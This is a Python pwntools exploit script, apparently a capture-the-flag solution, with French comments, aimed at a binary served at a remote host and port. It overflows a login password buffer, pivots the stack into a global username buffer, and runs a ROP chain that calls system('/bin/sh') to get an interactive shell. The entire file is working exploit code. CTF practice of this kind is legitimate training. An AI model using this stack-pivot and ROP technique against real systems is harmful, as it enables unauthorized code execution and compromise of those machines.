#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=2)
context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./bin")

if args.GDB:
    p = gdb.debug(
        "./bin",
        """
    source /home/user/.gdbinit-gef.py
    break *(login+149)
    continue
    """,
    )
elif args.LOCAL:
    p = process("./bin")
else:
    p = remote("cytech.tcdn.casa", 4604)

buf_user = 0x404060
stack_space = 4000 - 64  # on va vers la fin de la page pour laisser la place
pivot = buf_user + stack_space
g_pop_rdi = 0x00401313
g_ret = 0x00401314
g_pop_rsp_r13_r14_r15 = 0x0040130D
IGNORED = -1

main_payload = flat(
    {
        # str /bin/sh @ user
        0: b"/bin/sh\0",
        # ROPCHAIN @ user + stack_space
        stack_space: [
            IGNORED,
            IGNORED,
            IGNORED,  # on ignore les 3 pop du stack pivot (r13,r14,r15)
            g_pop_rdi,
            buf_user,
            g_ret,
            exe.plt.system,
        ],
    }
)

log.hexdump(main_payload)
p.sendlineafter(b"Username: ", main_payload)

pivot_payload = flat(
    {
        16: [
            g_pop_rsp_r13_r14_r15,  # pivot to user
            pivot,  # les 3 prochains registres seront pop depuis la nouvelle stack (user)
        ],
    }
)
log.hexdump(pivot_payload)

p.sendlineafter(b"Password: ", pivot_payload)
p.interactive()
